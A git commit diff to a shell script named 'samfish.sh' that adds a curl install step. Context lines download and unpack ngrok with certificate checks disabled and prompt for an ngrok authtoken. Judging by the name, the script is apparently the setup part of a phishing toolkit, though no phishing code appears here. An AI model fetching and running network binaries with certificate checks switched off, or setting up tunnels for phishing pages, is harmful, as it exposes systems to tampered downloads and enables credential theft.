ba43aadb189689b0d15dc9ff2a7f85b96103db68
Munazirul Islam <50363300+Munazirul@users.noreply.github.com>
2022-01-23 18:07:19 +0530

    Update samfish.sh

--- samfish.sh
+++ samfish.sh
@@ -22,6 +22,7 @@ packages_install(){
     ./ngrok authtoken $token >/dev/null 2>&1
     else 
     apt install wget -y >/dev/null 2>&1 && apt install unzip >/dev/null 2>&1
+    apt install curl -y >/dev/null 2>&1
     wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip >/dev/null 2>&1 && unzip ngrok-stable-linux-amd64.zip && rm -rf ngrok-stable-linux-amd64.zip && chmod +x ngrok >/dev/null 2>&1
     printf "[~] Create an account at ngrok.com and paste the authtoken here (If you have already configured the authtoken, press enter)\n."
     read -p "[+] Paste your authtoken: " token 
